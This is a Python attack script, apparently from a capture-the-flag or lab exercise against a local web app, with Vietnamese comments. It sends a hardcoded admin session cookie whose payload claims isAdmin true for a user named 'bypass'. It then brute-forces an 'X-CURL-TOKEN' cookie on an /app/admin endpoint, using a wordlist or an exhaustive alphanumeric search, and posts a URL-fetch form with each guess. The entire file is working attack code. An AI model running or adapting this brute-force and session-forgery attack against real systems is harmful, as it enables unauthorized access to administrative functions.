import requests
import itertools
import string

URL = "http://127.0.0.1:8001/app/admin"   # đổi cho đúng
SESSION_COOKIE = "eyJpc0FkbWluIjp0cnVlLCJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJieXBhc3MifQ.aKvTcQ.m3onzS0n_TO-7wf-Y4GN07Gucxc"  # cookie 'session' sau khi login với tài khoản admin

def is_token_valid(token: str) -> bool:
    cookies = {
        "session": SESSION_COOKIE,
        "X-CURL-TOKEN": token,
    }
    # payload hợp lệ, gọi ra 1 site public để tránh timeout
    data = {
        "scheme": "http://",
        "host": "example.com",
        "port": "80",
        "path": "/",
    }
    r = requests.post(URL, cookies=cookies, data=data, timeout=5)
    return "Token is not valid" not in r.text

def brute_from_wordlist(wordlist_path: str):
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            token = line.strip()
            if not token:
                continue
            if is_token_valid(token):
                print("[+] Found token (wordlist):", token)
                return token
    print("[-] Not found in wordlist")
    return None

def brute_charset_lengths(min_len=1, max_len=20, alphabet=None):
    if alphabet is None:
        alphabet = string.ascii_letters + string.digits
    for L in range(min_len, max_len+1):
        for guess in itertools.product(alphabet, repeat=L):
            token = "".join(guess)
            if is_token_valid(token):
                print("[+] Found token:", token)
                return token
    print("[-] Not found in charset brute")
    return None

if __name__ == "__main__":
    token = brute_charset_lengths(min_len=1, max_len=20)

    if token:
        print("Use token:", token)
